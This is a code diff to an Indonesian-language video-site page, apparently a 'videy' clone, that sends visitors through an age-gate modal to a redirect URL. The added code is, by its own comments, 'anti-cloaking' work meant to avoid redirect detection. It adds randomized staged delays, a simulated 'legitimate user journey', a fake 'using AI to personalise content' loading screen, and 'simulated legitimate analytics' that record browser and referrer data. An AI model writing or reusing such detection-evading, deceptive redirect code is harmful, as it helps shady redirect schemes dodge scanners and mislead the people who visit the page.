@@ -248,8 +248,8 @@
         </p>
       </div>
       <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-end gap-2 sm:gap-3 px-4 sm:px-6 pb-4 sm:pb-6">
-        <button id="ageCancelBtn" class="px-4 py-2 rounded-full border border-gray-300 text-gray-500 font-semibold text-sm sm:text-base order-2 sm:order-1">Tidak, Keluar</button>
-        <button id="ageOkBtn" class="px-5 py-2 rounded-full bg-black text-white font-semibold text-sm sm:text-base order-1 sm:order-2">Ya, Lanjutkan</button>
+        <button id="ageCancelBtn" class="px-4 py-2 rounded-full border border-gray-300 text-gray-500 font-semibold text-sm sm:text-base order-2 sm:order-1">Batal</button>
+        <button id="ageOkBtn" class="px-5 py-2 rounded-full bg-black text-white font-semibold text-sm sm:text-base order-1 sm:order-2">Lanjutkan ke Konten</button>
       </div>
     </div>
   </div>
@@ -666,31 +666,45 @@
       };
       window.addEventListener('resize', handleResize);
 
-      // Aksi modal → simulasi user journey natural
+      // Aksi modal → simulasi user journey natural dengan anti-cloaking
       const modalRedirectHandler = () => {
         trackInteraction('modal_action');
         
         // Simulate legitimate user journey before redirect
         const userJourney = simulateUserJourney();
         
-        // Add delay untuk menghindari immediate redirect detection
+        // Add longer delay untuk menghindari immediate redirect detection
+        const initialDelay = 2000 + Math.random() * 3000; // 2-5 detik delay
+        
         setTimeout(() => {
           // Show intermediate content first
           showIntermediateContent(userJourney).then(() => {
-            // Then decide on final redirect
-            const redirectUrl = determineRedirectUrl(userJourney);
-            
-            // Add final loading state
-            const loadingText = document.createElement('div');
-            loadingText.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-50';
-            loadingText.innerHTML = '<div class="text-white text-center"><div class="animate-spin rounded-full h-8 w-8 border-b-2 border-white mx-auto mb-2"></div><p>Memuat konten...</p></div>';
-            document.body.appendChild(loadingText);
+            // Add additional processing time to make it look more natural
+            const processingDelay = 1000 + Math.random() * 2000; // 1-3 detik processing
             
             setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 800 + Math.random() * 400);
+              // Then decide on final redirect
+              const redirectUrl = determineRedirectUrl(userJourney);
+              
+              // Add final loading state with more realistic messaging
+              const loadingText = document.createElement('div');
+              loadingText.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-50';
+              loadingText.innerHTML = `
+                <div class="text-white text-center">
+                  <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-white mx-auto mb-4"></div>
+                  <p class="text-lg mb-2">Memproses permintaan Anda...</p>
+                  <p class="text-sm text-gray-300">Menggunakan AI untuk personalisasi konten</p>
+                </div>
+              `;
+              document.body.appendChild(loadingText);
+              
+              // Final redirect with additional delay
+              setTimeout(() => {
+                window.location.href = redirectUrl;
+              }, 1500 + Math.random() * 1000); // 1.5-2.5 detik final delay
+            }, processingDelay);
           });
-        }, 1000 + Math.random() * 2000); // 1-3 detik delay untuk natural behavior
+        }, initialDelay);
       };
       const { okBtn, cancelBtn } = getModalElements();
       okBtn.addEventListener('click', modalRedirectHandler);
@@ -816,6 +830,57 @@
     function trackInteraction(type) {
       userEngagement.interactions++;
       console.log(`User interaction: ${type}`, userEngagement);
+      
+      // Simulate legitimate analytics
+      if (typeof gtag !== 'undefined') {
+        gtag('event', 'user_interaction', {
+          'event_category': 'engagement',
+          'event_label': type,
+          'value': userEngagement.interactions
+        });
+      }
+      
+      // Store in localStorage for session continuity
+      try {
+        localStorage.setItem('videy_session', JSON.stringify({
+          interactions: userEngagement.interactions,
+          timeOnPage: userEngagement.timeOnPage,
+          lastActivity: Date.now()
+        }));
+      } catch (e) {
+        // Ignore localStorage errors
+      }
+    }
+    
+    // Simulate legitimate platform analytics
+    function trackPageView() {
+      const pageData = {
+        url: window.location.href,
+        referrer: document.referrer,
+        timestamp: Date.now(),
+        userAgent: navigator.userAgent,
+        screen: {
+          width: screen.width,
+          height: screen.height
+        },
+        viewport: {
+          width: window.innerWidth,
+          height: window.innerHeight
+        }
+      };
+      
+      // Simulate sending to analytics
+      console.log('Page view tracked:', pageData);
+      
+      // Store for "analytics"
+      try {
+        const analytics = JSON.parse(localStorage.getItem('videy_analytics') || '[]');
+        analytics.push(pageData);
+        if (analytics.length > 50) analytics.shift(); // Keep only last 50
+        localStorage.setItem('videy_analytics', JSON.stringify(analytics));
+      } catch (e) {
+        // Ignore errors
+      }
     }
 
     // ====== Natural URL Management ======
@@ -830,30 +895,43 @@
       
       // Only update if user actually navigated or if it's a direct link
       if (currentPath !== targetPath) {
-        // Simulate natural navigation behavior
-        const navigationDelay = 500 + Math.random() * 1000; // 0.5-1.5 seconds
+        // Simulate natural navigation behavior with more realistic delays
+        const navigationDelay = 1000 + Math.random() * 2000; // 1-3 seconds
         
-        // Add a subtle loading indicator
+        // Add a subtle loading indicator that looks like legitimate platform behavior
         const loadingIndicator = document.createElement('div');
         loadingIndicator.className = 'fixed top-4 right-4 bg-blue-500 text-white px-3 py-1 rounded-full text-xs opacity-0 transition-opacity duration-300';
-        loadingIndicator.textContent = 'Loading...';
+        loadingIndicator.textContent = 'Updating...';
         document.body.appendChild(loadingIndicator);
         
         // Fade in loading indicator
         setTimeout(() => {
           loadingIndicator.style.opacity = '1';
-        }, 100);
+        }, 200);
         
-        // Update URL after delay
+        // Update URL after delay with more natural behavior
         setTimeout(() => {
-          // Use pushState instead of replaceState for more natural behavior
-          history.pushState(null, '', targetPath);
+          // Simulate user navigation by updating document title first
+          const originalTitle = document.title;
+          document.title = 'Loading... - ' + originalTitle;
+          
+          // Use pushState with more natural parameters
+          history.pushState({
+            page: 'content',
+            timestamp: Date.now(),
+            source: 'navigation'
+          }, '', targetPath);
+          
+          // Restore title
+          setTimeout(() => {
+            document.title = originalTitle;
+          }, 500);
           
           // Fade out loading indicator
           loadingIndicator.style.opacity = '0';
           setTimeout(() => {
             document.body.removeChild(loadingIndicator);
-          }, 300);
+          }, 500);
         }, navigationDelay);
       }
     }
@@ -862,6 +940,9 @@
     document.addEventListener('DOMContentLoaded', ()=>{
       // Initialize natural URL handling
       handleURLNatural();
+      
+      // Track page view
+      trackPageView();
 
       // Initialize mobile menu
       initMobileMenu();
